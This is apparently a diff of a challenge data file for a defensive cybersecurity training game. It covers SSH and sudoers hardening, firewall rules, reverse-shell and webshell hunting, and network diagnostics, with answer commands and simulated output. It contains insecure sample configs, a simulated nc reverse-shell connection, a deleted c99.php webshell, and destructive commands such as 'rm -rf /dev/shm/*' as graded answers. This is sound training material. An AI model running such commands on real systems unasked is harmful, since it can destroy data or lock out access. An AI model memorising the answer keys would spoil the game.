-    educationalNote: "Attackers often bind SSH to weird high ports to bypass standard firewall rules and hide their traffic. Restoring the default Port 22 is required for business SLAs.",
-    variables: { ROGUE_PORT: ['2222', '1337', '8080', '4444', '65535'] },
-    payload: { filename: '/etc/ssh/sshd_config', initialContent: 'Port {{ROGUE_PORT}}\nPermitRootLogin no\nPasswordAuthentication yes', successRegex: '\\b[Pp]ort\\s+22\\b' }
-  },
-  {
-    id: 'cfg-linux-sudoers',
-    tier: 2,
-    verb: 'SECURE SUDOERS!',
-    engine: 'CONFIG_EDIT',
-    timeLimitMs: 15000,
-    category: 'Linux',
-    hint: 'Delete the NOPASSWD line entirely',
-    educationalNote: "Adding 'NOPASSWD: ALL' for a low-privilege user like www-data allows a compromised web app to instantly execute commands as root without authentication.",
-    payload: { filename: '/etc/sudoers', initialContent: 'root ALL=(ALL:ALL) ALL\nwww-data ALL=(ALL) NOPASSWD: ALL', successRegex: '^\\s*root ALL=\\(ALL:ALL\\) ALL\\s*$' }
-  },
-  {
-    id: 'gui-win-startup',
-    tier: 2,
-    verb: 'CHECK STARTUP APPS!',
-    engine: 'GUI_NAV',
-    timeLimitMs: 12000,
-    category: 'Windows',
-    hint: 'Task Manager then Startup',
-    educationalNote: "Reviewing the Startup Apps tab in Task Manager is a quick visual way to spot malicious executables that are set to run every time the user logs in.",
+    hintNudge: 'Socket statistics for TCP/UDP listening ports.',
+    hintSolution: 'ss -tulpn',
+    educationalNote: "'ss -tulpn' shows all listening ports and the exact process names and PIDs bound to them.",
     payload: {
-      windowTitle: 'Task Manager',
-      steps: [
-        { correctOption: 'Startup', options: ['Processes', 'Performance', 'App history', 'Startup', 'Users', 'Details', 'Services'] }
-      ],
-      finalToggle: { label: 'svch0st.exe (Disable)' }
+      prompt: 'root@server:~#',
+      successCommands: ['ss -tulpn', 'ss -tuln', 'netstat -tulpn', 'netstat -ano', 'ss -lntp', 'ss'],
+      simulatedOutput: 'Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process\ntcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*      users:(("sshd",pid=621,fd=3))\ntcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*      users:(("nginx",pid=789,fd=6))'
     }
   },
   {
-    id: 'gui-win-users',
-    tier: 2,
-    verb: 'VIEW LOCAL USERS!',
-    engine: 'GUI_NAV',
-    timeLimitMs: 15000,
-    category: 'Windows',
-    hint: 'Computer Management then System Tools then Local Users and Groups then Users',
-    educationalNote: "Attackers frequently create rogue accounts (like 'BackupAdmin') and add them to the Administrators group. You must check Computer Management to verify accounts.",
+    id: 'cli-net-ping',
+    tier: 1,
+    verb: 'TEST HOST REACHABILITY!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Firewall',
+    hintNudge: 'Standard ICMP reachability tool.',
+    hintSolution: 'ping',
+    educationalNote: "Pinging verifies upstream router connectivity and checks whether firewall drop rules are working.",
     payload: {
-      windowTitle: 'Computer Management',
-      steps: [
-        { correctOption: 'System Tools', options: ['System Tools', 'Storage', 'Services and Applications'] },
-        { correctOption: 'Local Users and Groups', options: ['Event Viewer', 'Shared Folders', 'Local Users and Groups', 'Performance', 'Device Manager'] },
-        { correctOption: 'Users', options: ['Users', 'Groups'] }
-      ],
-      finalToggle: { label: 'BackupAdmin (Disable Account)' }
+      prompt: 'root@server:~#',
+      successCommands: ['ping', 'ping 8.8.8.8', 'ping 127.0.0.1', 'ping google.com', 'ping 10.0.0.1'],
+      simulatedOutput: 'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.2 ms'
     }
   },
   {
-    id: 'mc-conn',
-    tier: 2,
-    verb: 'ANALYZE CONNECTIONS!',
-    engine: 'MULTIPLE_CHOICE',
-    timeLimitMs: 15000,
-    category: 'Linux',
-    hint: 'Look for an ESTAB connection to a suspicious high port',
-    educationalNote: "A reverse shell creates an ESTABLISHED outbound connection from a random local port to the attacker's C2 server port (e.g., 4444, 1337). Web traffic usually bounds to 80/443.",
+    id: 'cli-net-curl',
+    tier: 1,
+    verb: 'FETCH HTTP URL!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Firewall',
+    hintNudge: 'Command line URL fetcher.',
+    hintSolution: 'curl',
+    educationalNote: "'curl' tests whether local web servers and API endpoints respond with proper HTTP status codes.",
     payload: {
-      question: "Which of the following 'ss -tnp' outputs indicates an active reverse shell?",
-      options: [
-        { text: "LISTEN 0 128 0.0.0.0:22 0.0.0.0:*", isCorrect: false, feedback: "This is just SSH listening for incoming connections." },
-        { text: "ESTAB  0 0 192.168.1.10:80 10.0.0.5:54321", isCorrect: false, feedback: "This is a normal web request coming into your scored port 80." },
-        { text: "ESTAB  0 0 192.168.1.10:49281 10.10.10.50:4444", isCorrect: true },
-        { text: "TIME-WAIT 0 0 127.0.0.1:3306 127.0.0.1:48192", isCorrect: false, feedback: "This is a closed database connection cleaning up." }
-      ]
+      prompt: 'root@server:~#',
+      successCommands: ['curl', 'wget', 'curl localhost', 'curl 127.0.0.1', 'curl -I localhost'],
+      simulatedOutput: 'HTTP/1.1 200 OK\nServer: nginx\nContent-Type: text/html'
     }
   },
   {
-    id: 'mc-triage',
+    id: 'cli-net-traceroute',
     tier: 1,
-    verb: 'TRIAGE SERVICE DOWN!',
-    engine: 'MULTIPLE_CHOICE',
-    timeLimitMs: 15000,
+    verb: 'TRACE ROUTE TO HOST!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
     category: 'Firewall',
-    hint: 'Always verify the process is actually running before assuming it is a network block.',
-    educationalNote: "If the scoring engine reports a service is down, don't immediately panic and flush iptables. The attacker likely just killed the process. Verify it is running first using systemctl or ps.",
+    hintNudge: 'Network path tracing utility.',
+    hintSolution: 'traceroute',
+    educationalNote: "'traceroute' identifies intermediate hops and packet filtering bottlenecks across routers.",
     payload: {
-      question: "The scoring engine turns RED for your Web Server. What is the FIRST step you should take?",
-      options: [
-        { text: "Run 'iptables -F' to clear all firewall rules just in case.", isCorrect: false, feedback: "Never flush the firewall blindly. You will expose the entire box." },
-        { text: "Check if the Apache/Nginx process is actually running.", isCorrect: true },
-        { text: "Change the web administrator password.", isCorrect: false, feedback: "This doesn't bring the service back up." },
-        { text: "Reboot the server immediately.", isCorrect: false, feedback: "Rebooting is slow and might trigger persistence mechanisms." }
-      ]
+      prompt: 'root@server:~#',
+      successCommands: ['traceroute', 'tracert', 'tracepath', 'traceroute 8.8.8.8'],
+      simulatedOutput: '1  192.168.1.1 (192.168.1.1)  1.214 ms\n2  10.0.0.1 (10.0.0.1)  4.318 ms\n3  8.8.8.8 (8.8.8.8)  14.120 ms'
     }
   },
   {
-    id: 'multi-evict',
-    tier: 3,
-    category: 'Linux',
-    educationalNote: "If you spot an active attacker using 'w', you must find their TTY session (e.g., pts/1) and forcefully kill it. This kicks them out and buys you a few seconds to patch the vulnerability.",
-    variables: { TTY: ['1', '2', '3'] },
-    stages: [
-      {
-        verb: 'FIND ATTACKER TTY!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 8000,
-        hint: 'w',
-        payload: { prompt: 'root@server:~#', successCommands: ['w'], simulatedOutput: 'USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    10.0.0.5         13:00    1.00s  0.10s  0.05s -bash\nroot     pts/{{TTY}}    10.10.10.50      13:15    0.00s  0.02s  0.00s bash' }
-      },
-      {
-        verb: 'EVICT ATTACKER!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 15000,
-        hint: 'pkill -9 -t pts/{{TTY}}',
-        payload: { prompt: 'root@server:~#', successCommands: ['pkill -9 -t pts/{{TTY}}', 'pkill -KILL -t pts/{{TTY}}'] }
-      }
-    ]
-  },
-  {
-    id: 'cli-win-guest',
+    id: 'cli-net-ufw-status',
     tier: 1,
-    verb: 'DISABLE GUEST!',
+    verb: 'CHECK FIREWALL STATUS!',
     engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Windows',
-    hint: 'net user Guest /active:no',
-    educationalNote: "The built-in Guest account has historically been abused by attackers for unauthenticated lateral movement. Disabling it is an essential baseline hardening requirement in CCDC.",
-    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['net user Guest /active:no', 'net user guest /active:no'] }
+    timeLimitMs: 11000,
+    category: 'Firewall',
+    hintNudge: 'Uncomplicated firewall status check.',
+    hintSolution: 'ufw status',
+    educationalNote: "'ufw status' displays active firewall rules and whether rules apply to IPv4 and IPv6.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['ufw status', 'ufw status verbose', 'iptables -L', 'ufw'],
+      simulatedOutput: 'Status: active\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW       Anywhere'
+    }
   },
   {
-    id: 'cli-win-killproc',
-    tier: 2,
-    verb: 'KILL NETCAT!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Windows',
-    hint: 'Stop-Process -Name nc -Force',
-    educationalNote: "Netcat (nc.exe) is frequently planted as a persistent reverse shell beacon. Forcefully killing the process severs the active command channel immediately.",
-    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Stop-Process -Name nc -Force', 'taskkill /F /IM nc.exe', 'taskkill /f /im nc.exe'] }
-  },
-  {
-    id: 'cli-linux-suid',
-    tier: 2,
-    verb: 'AUDIT SUID!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 15000,
-    category: 'Linux',
-    hint: 'find / -perm -4000 -type f 2>/dev/null',
-    educationalNote: "SUID binaries run with the privileges of their owner (root). Threat actors frequently copy /bin/bash or custom tools into /tmp with SUID permissions to maintain root persistence.",
-    payload: { prompt: 'root@server:~#', successCommands: ['find / -perm -4000 -type f 2>/dev/null', 'find / -perm -u=s -type f 2>/dev/null'] }
-  },
-  {
-    id: 'cfg-linux-rootssh',
-    tier: 2,
-    verb: 'DISABLE ROOT SSH!',
-    engine: 'CONFIG_EDIT',
-    timeLimitMs: 15000,
-    category: 'Linux',
-    hint: 'Change PermitRootLogin yes to PermitRootLogin no',
-    educationalNote: "Allowing direct SSH root logins makes brute-forcing trivial and leaves no user audit trail. Enforcing PermitRootLogin no forces attackers to escalate from an unprivileged user.",
-    payload: { filename: '/etc/ssh/sshd_config', initialContent: 'Port 22\nPermitRootLogin yes\nPasswordAuthentication yes', successRegex: 'PermitRootLogin\\s+no' }
-  },
-  {
-    id: 'cli-fw-telnet',
+    id: 'cli-net-ufw-enable',
     tier: 1,
-    verb: 'BLOCK TELNET!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Firewall',
-    hint: 'ufw deny 23',
-    educationalNote: "Telnet transmits plaintext credentials over the wire. Port 23 should always be blocked on boundary firewalls unless an inject strictly scores an unencrypted legacy protocol.",
-    payload: { prompt: 'root@edge-router:~#', successCommands: ['ufw deny 23', 'iptables -A INPUT -p tcp --dport 23 -j DROP'] }
-  },
-  {
-    id: 'cli-fw-default',
-    tier: 2,
-    verb: 'DEFAULT DENY!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Firewall',
-    hint: 'ufw default deny incoming',
-    educationalNote: "A proper defensive security perimeter drops all unrequested ingress traffic by default. Once default deny incoming is enabled, you only open ports that are scored by the engine.",
-    payload: { prompt: 'root@edge-router:~#', successCommands: ['ufw default deny incoming', 'ufw default deny'] }
-  },
-  {
-    id: 'gui-win-firewall',
-    tier: 2,
     verb: 'ENABLE FIREWALL!',
-    engine: 'GUI_NAV',
-    timeLimitMs: 15000,
-    category: 'Windows',
-    hint: 'System and Security then Windows Defender Firewall then Turn Windows Defender Firewall on or off',
-    educationalNote: "Attackers frequently turn off the local host firewall upon compromising a Windows server. Knowing how to quickly toggle the firewall back on cuts off lateral SMB and RPC scans.",
-    payload: {
-      windowTitle: 'Windows Defender Firewall',
-      steps: [
-        { correctOption: 'System and Security', options: ['System and Security', 'Network and Internet', 'Hardware and Sound', 'Programs'] },
-        { correctOption: 'Windows Defender Firewall', options: ['Security and Maintenance', 'Windows Defender Firewall', 'System', 'Power Options'] },
-        { correctOption: 'Customize Settings', options: ['Allow an app', 'Change notification settings', 'Customize Settings', 'Restore defaults'] }
-      ],
-      finalToggle: { label: 'Turn on Windows Defender Firewall' }
-    }
-  },
-  {
-    id: 'mc-inject-dns',
-    tier: 1,
-    verb: 'TRIAGE DNS INJECT!',
-    engine: 'MULTIPLE_CHOICE',
-    timeLimitMs: 15000,
-    category: 'Injects',
-    hint: 'A DNS query failure should be tested using dig or nslookup against the local nameserver.',
-    educationalNote: "Business injects often require troubleshooting internal resolution. If your applications cannot resolve the scoring server hostname, dig or nslookup against your specified nameserver verifies if DNS is reachable.",
-    payload: {
-      question: "Your CEO inject asks why internal portals cannot reach mail.corp.local. What command directly verifies DNS resolution?",
-      options: [
-        { text: "ping -c 4 127.0.0.1", isCorrect: false, feedback: "Pinging localhost only tests the local network stack, not DNS resolution." },
-        { text: "dig @10.0.0.1 mail.corp.local", isCorrect: true },
-        { text: "cat /etc/passwd", isCorrect: false, feedback: "Checking the password file has nothing to do with domain name resolution." },
-        { text: "systemctl restart ufw", isCorrect: false, feedback: "Restarting the firewall might disrupt active scored connections." }
-      ]
-    }
-  },
-  {
-    id: 'multi-hunt-c2',
-    tier: 3,
-    category: 'Linux',
-    educationalNote: "Spotting an active beacon requires querying outbound ESTABLISHED sockets. Once the foreign IP is spotted, dropping outbound traffic to it on the firewall and adding it to /etc/hosts.deny immediately breaks C2 persistence.",
-    variables: { C2_IP: ['10.10.10.50', '198.51.100.23', '203.0.113.88'] },
-    stages: [
-      {
-        verb: 'SPOT ACTIVE C2!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 9000,
-        hint: 'ss -tnp',
-        payload: {
-          prompt: 'root@server:~#',
-          successCommands: ['ss -tnp', 'ss -antp', 'netstat -tnp'],
-          simulatedOutput: 'State      Recv-Q Send-Q Local Address:Port Peer Address:Port Process\nESTAB      0      0      192.168.1.10:49281 {{C2_IP}}:4444 users:(("nc",pid=1337,fd=3))'
-        }
-      },
-      {
-        verb: 'BLOCK OUTBOUND IP!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 12000,
-        hint: 'ufw deny out from any to {{C2_IP}}',
-        payload: {
-          prompt: 'root@server:~#',
-          successCommands: [
-            'ufw deny out to {{C2_IP}}',
-            'ufw deny out from any to {{C2_IP}}',
-            'iptables -A OUTPUT -d {{C2_IP}} -j DROP'
-          ],
-          simulatedOutput: 'Rule added\nRule added (v6)'
-        }
-      },
-      {
-        verb: 'ADD TO HOSTS DENY!',
-        engine: 'CONFIG_EDIT',
-        timeLimitMs: 28000,
-        hint: 'Add line "ALL: {{C2_IP}}" to hosts.deny',
-        payload: {
-          filename: '/etc/hosts.deny',
-          initialContent: '# /etc/hosts.deny\n# Global TCP wrapper blacklist\n',
-          successRegex: 'ALL\\s*:\\s*{{C2_IP}}'
-        }
-      }
-    ]
-  },
-  {
-    id: 'multi-mysql-triage',
-    tier: 2,
-    category: 'Linux',
-    educationalNote: "Databases should never listen on public interfaces (0.0.0.0). Restricting MySQL to loopback (127.0.0.1) prevents unauthenticated external network attacks like SQL injection pivots or brute-forcing.",
-    stages: [
-      {
-        verb: 'INSPECT MYSQL PORT!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 8000,
-        hint: 'ss -tulpn | grep 3306',
-        payload: {
-          prompt: 'root@db-server:~#',
-          successCommands: ['ss -tulpn | grep 3306', 'ss -tulpn', 'netstat -tulpn | grep 3306'],
-          simulatedOutput: 'tcp  LISTEN 0  128  0.0.0.0:3306  0.0.0.0:*  users:(("mysqld",pid=842,fd=21))'
-        }
-      },
-      {
-        verb: 'RESTRICT TO LOCALHOST!',
-        engine: 'CONFIG_EDIT',
-        timeLimitMs: 24000,
-        hint: 'Change bind-address = 0.0.0.0 to bind-address = 127.0.0.1',
-        payload: {
-          filename: '/etc/mysql/my.cnf',
-          initialContent: '[mysqld]\nport = 3306\nbind-address = 0.0.0.0\nmax_connections = 100',
-          successRegex: 'bind-address\\s*=\\s*127\\.0\\.0\\.1'
-        }
-      }
-    ]
-  },
-  {
-    id: 'multi-apache-webshell',
-    tier: 3,
-    category: 'Linux',
-    educationalNote: "Attackers drop PHP webshells into upload directories to maintain persistent execution. You must find the file, remove it, and disable PHP execution functions in php.ini.",
-    stages: [
-      {
-        verb: 'LOCATE WEBSHELL!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 8000,
-        hint: 'ls -la /var/www/html',
-        payload: {
-          prompt: 'root@web:~#',
-          successCommands: ['ls -la /var/www/html', 'ls -la', 'ls /var/www/html'],
-          simulatedOutput: 'total 28\n-rw-r--r-- 1 www-data www-data  412 Oct 12 10:00 index.html\n-rwxrwxrwx 1 www-data www-data 8492 Oct 12 10:14 c99.php'
-        }
-      },
-      {
-        verb: 'DELETE WEBSHELL!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 8000,
-        hint: 'rm -f /var/www/html/c99.php',
-        payload: {
-          prompt: 'root@web:~#',
-          successCommands: ['rm -f /var/www/html/c99.php', 'rm /var/www/html/c99.php', 'rm c99.php']
-        }
-      },
-      {
-        verb: 'DISABLE PHP EXEC!',
-        engine: 'CONFIG_EDIT',
-        timeLimitMs: 28000,
-        hint: 'Add disable_functions = exec,system to php.ini',
-        payload: {
-          filename: '/etc/php/8.1/apache2/php.ini',
-          initialContent: '[PHP]\nengine = On\nshort_open_tag = Off\n',
-          successRegex: 'disable_functions\\s*=\\s*(exec\\s*,\\s*system|system\\s*,\\s*exec)'
-        }
-      }
-    ]
-  },
-  {
-    id: 'multi-win-lateral',
-    tier: 2,
-    category: 'Windows',
-    educationalNote: "When lateral movement is suspected, querying active TCP connections in PowerShell exposes foreign IPs connected to SMB (Port 445). Terminating LanmanServer severs all active SMB pipelines.",
-    stages: [
-      {
-        verb: 'INSPECT CONNECTIONS!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 9000,
-        hint: 'Get-NetTCPConnection -State Established',
-        payload: {
-          prompt: 'PS C:\\Windows\\system32>',
-          successCommands: [
-            'Get-NetTCPConnection -State Established',
-            'netstat -ano | findstr ESTABLISHED',
-            'netstat -ano'
-          ],
-          simulatedOutput: 'LocalAddress LocalPort RemoteAddress RemotePort State\n192.168.1.5  445       10.0.0.99     51234      Established'
-        }
-      },
-      {
-        verb: 'STOP SMB SERVICE!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 15000,
-        hint: 'Stop-Service -Name LanmanServer -Force',
-        payload: {
-          prompt: 'PS C:\\Windows\\system32>',
-          successCommands: [
-            'Stop-Service -Name LanmanServer -Force',
-            'Stop-Service LanmanServer -Force',
-            'net stop LanmanServer'
-          ],
-          simulatedOutput: 'Service LanmanServer stopped successfully.'
-        }
-      }
-    ]
-  },
-  {
-    id: 'cli-linux-devshm',
-    tier: 2,
-    verb: 'PURGE /DEV/SHM!',
     engine: 'CLI_EXEC',
-    timeLimitMs: 12000,
-    category: 'Linux',
-    hint: 'rm -rf /dev/shm/*',
-    educationalNote: 'Attackers often execute malware from /dev/shm (shared memory) because it\'s a tmpfs mount that doesn\'t touch disk, evading traditional AV file scans. Purging it destroys in-memory payloads.',
-    payload: { prompt: 'root@victim:~#', successCommands: ['rm -rf /dev/shm/*', 'rm -rf /dev/shm/.*', 'find /dev/shm -type f -delete'] },
-  },
-  {
-    id: 'cli-win-lsa',
-    tier: 2,
-    verb: 'PROTECT LSASS!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 15000,
-    category: 'Windows',
-    hint: 'Set-ItemProperty for RunAsPPL',
-    educationalNote: 'Enabling LSA Protection (RunAsPPL) prevents tools like Mimikatz from dumping credentials from the LSASS process. This is one of the most critical hardening steps on Windows servers.',
-    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name RunAsPPL -Value 1', 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f'] },
-  },
-  {
-    id: 'cfg-linux-limits',
-    tier: 1,
-    verb: 'DISABLE CORE DUMPS!',
-    engine: 'CONFIG_EDIT',
-    timeLimitMs: 18000,
-    category: 'Linux',
-    hint: 'Add * hard core 0',
-    educationalNote: 'Core dumps can expose sensitive memory contents including passwords and encryption keys. Disabling them with limits.conf prevents attackers from triggering crashes to harvest credentials.',
-    payload: { filename: '/etc/security/limits.conf', initialContent: '# /etc/security/limits.conf\n#\n# Each line describes a limit for a user in the form:\n#\n#<domain> <type> <item> <value>\n#\n', successRegex: '\\*\\s+hard\\s+core\\s+0' },
-  },
-  {
-    id: 'cli-fw-tor',
-    tier: 2,
-    verb: 'BLOCK TOR EXIT!',
-    engine: 'CLI_EXEC',
-    timeLimitMs: 14000,
+    timeLimitMs: 11000,
     category: 'Firewall',
-    hint: 'iptables -A INPUT -s {{IP}} -j DROP',
-    variables: { IP: ['185.220.101.42', '104.244.76.13', '199.249.230.163'] },
-    educationalNote: 'Tor exit nodes are frequently used by attackers to anonymize C2 traffic and exfiltration. Blocking known exit node IPs at the firewall layer cuts off this anonymization channel.',
-    payload: { prompt: 'root@edge-router:~#', successCommands: ['iptables -A INPUT -s {{IP}} -j DROP', 'iptables -I INPUT -s {{IP}} -j DROP', 'iptables -A INPUT -s {{IP}} -j REJECT'] },
-  },
-  {
-    id: 'gui-win-smbsign',
-    tier: 2,
-    verb: 'ENFORCE SMB SIGNING!',
-    engine: 'GUI_NAV',
-    timeLimitMs: 20000,
-    category: 'Windows',
-    hint: 'Local Security Policy > Security Options > SMB Server',
-    educationalNote: 'Without SMB signing, attackers can perform NTLM relay attacks to impersonate users and gain unauthorized access. Enforcing digital signatures on all SMB communications neutralizes this attack vector.',
+    hintNudge: 'Command to enable UFW.',
+    hintSolution: 'ufw enable',
+    educationalNote: "'ufw enable' activates packet filtering and starts enforcement on system startup.",
     payload: {
-      steps: [
-        { label: 'Open Tool', options: ['Local Security Policy', 'Registry Editor', 'Group Policy Editor', 'Device Manager'], correctOption: 'Local Security Policy' },
-        { label: 'Navigate To', options: ['Account Policies', 'Local Policies > Security Options', 'User Rights Assignment', 'Windows Firewall'], correctOption: 'Local Policies > Security Options' },
-        { label: 'Select Setting', options: ['Microsoft network server: Digitally sign communications (always)', 'Network access: Do not allow anonymous enumeration', 'Interactive logon: Do not display last user name', 'Network security: LAN Manager authentication level'], correctOption: 'Microsoft network server: Digitally sign communications (always)' },
-      ],
-      finalToggle: { label: 'Enable SMB Signing', correctValue: true },
-    },
+      prompt: 'root@server:~#',
+      successCommands: ['ufw enable', 'ufw reload'],
+      simulatedOutput: 'Firewall is active and enabled on system startup'
+    }
   },
   {
-    id: 'mc-ransomware-triage',
-    tier: 3,
-    verb: 'CONTAIN RANSOMWARE!',
-    engine: 'MULTIPLE_CHOICE',
-    timeLimitMs: 18000,
-    category: 'Injects',
-    hint: 'Isolate the host immediately',
-    educationalNote: 'When ransomware is detected actively encrypting files, the priority is network isolation to prevent lateral spread. Shutting down the host destroys volatile memory evidence needed for forensic analysis and decryption key recovery.',
-    payload: {
-      question: 'Active ransomware encryption detected on a database server. Files are being encrypted in real-time. The server holds live customer transaction data. What is the BEST immediate response?',
-      options: [
-        { text: 'Immediately shut down the server to stop encryption', isCorrect: false, feedback: 'Shutting down destroys volatile memory that may contain the encryption key. You lose forensic evidence and any chance of key recovery.' },
-        { text: 'Isolate the host from the network, capture memory dump, then assess', isCorrect: true },
-        { text: 'Attempt to kill the ransomware process and restore from backup', isCorrect: false, feedback: 'Killing the process without isolation allows lateral movement to continue. Other hosts may already be compromised.' },
-        { text: 'Pay the ransom demand immediately to minimize data loss', isCorrect: false, feedback: 'Never pay ransom as first response. It funds criminal operations and there is no guarantee of decryption. Isolate and assess first.' },
-      ],
-    },
-  },
-  {
-    id: 'cli-linux-uid0',
+    id: 'cli-net-ufw-allow',
     tier: 2,
-    verb: 'AUDIT ROOT ACCOUNTS!',
+    verb: 'ALLOW PORT IN FIREWALL!',
     engine: 'CLI_EXEC',
-    timeLimitMs: 14000,
-    category: 'Linux',
-    hint: 'awk -F: to find UID 0 accounts',
-    educationalNote: 'Attackers create stealth backdoor accounts with UID 0 in /etc/passwd to gain persistent root access. Regularly auditing for unauthorized UID 0 entries is a critical CCDC defensive check.',
-    payload: { prompt: 'root@server:~#', successCommands: ['awk -F: \'($3 == 0) {print}\' /etc/passwd', 'awk -F: \'$3 == 0\' /etc/passwd', 'grep \':0:\' /etc/passwd', 'cat /etc/passwd | grep \':0:\''] },
+    timeLimitMs: 11000,
+    category: 'Firewall',
+    hintNudge: 'UFW allow port rule.',
+    hintSolution: 'ufw allow',
+    educationalNote: "Opening ports for scored services (e.g., 'ufw allow 80/tcp') prevents scoring engine downtime.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['ufw allow', 'ufw allow 22', 'ufw allow 80', 'ufw allow 443'],
+      simulatedOutput: 'Rule added\nRule added (v6)'
+    }
   },
   {
-    id: 'multi-hunt-websocket',
-    tier: 3,
-    category: 'Linux',
-    educationalNote: 'Attackers use non-standard ports to run covert websocket proxies for C2 communication. Detecting unusual listening ports with ss/netstat and terminating the rogue PID is a critical incident response skill.',
-    stages: [
-      {
-        verb: 'FIND ROGUE PORT!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 12000,
-        hint: 'ss -tulnp or netstat -tulnp',
-        payload: { prompt: 'root@web:~#', successCommands: ['ss -tulnp', 'ss -tulnp | grep LISTEN', 'netstat -tulnp', 'netstat -tulnp | grep LISTEN'], simulatedOutput: 'State  Recv-Q  Send-Q  Local:Port  Peer:Port  Process\nLISTEN 0       128     0.0.0.0:8443   0.0.0.0:*     users:(("ws-proxy",pid=31337,fd=3))' },
-      },
-      {
-        verb: 'KILL ROGUE PROXY!',
-        engine: 'CLI_EXEC',
-        timeLimitMs: 10000,
-        hint: 'kill -9 31337',
-        payload: { prompt: 'root@web:~#', successCommands: ['kill -9 31337', 'kill 31337', 'pkill ws-proxy', 'pkill -9 ws-proxy'] },
-      },
-    ],
+    id: 'cli-net-ufw-deny',
+    tier: 2,
+    verb: 'BLOCK PORT IN FIREWALL!',
+    engine: 'CLI_EXEC',
+    timeLimitMs: 11000,
+    category: 'Firewall',
+    hintNudge: 'UFW deny rule.',
+    hintSolution: 'ufw deny',
+    educationalNote: "'ufw deny 4444' or 'ufw deny from <IP>' severs an attacker's C2 connection at the network edge.",
+    payload: {
+      prompt: 'root@server:~#',
+      successCommands: ['ufw deny', 'ufw deny 4444', 'ufw drop', 'iptables -A INPUT -j DROP'],
+      simulatedOutput: 'Rule added\nRule added (v6)'
+    }
   },
+  {
+    id: 'cfg-fw-default-drop',
+    tier: 2,
+    verb: 'DEFAULT DROP POLICY!',
+    engine: 'CONFIG_EDIT',
+    timeLimitMs: 11000,
+    category: 'Firewall',
+    hintNudge: 'Change DEFAULT_INPUT_POLICY to DROP.',
+    hintSolution: 'Set DEFAULT_INPUT_POLICY="DROP"',
+    educationalNote: "A default DROP policy blocks all unsolicited inbound traffic unless explicitly permitted.",
+    payload: {
+      filename: '/etc/default/ufw',
+      initialContent: '# /etc/default/ufw\nDEFAULT_INPUT_POLICY="ACCEPT"\nDEFAULT_OUTPUT_POLICY="ACCEPT"',
+      successRegex: 'DEFAULT_INPUT_POLICY="DROP"'
+    }
+  }
 ];
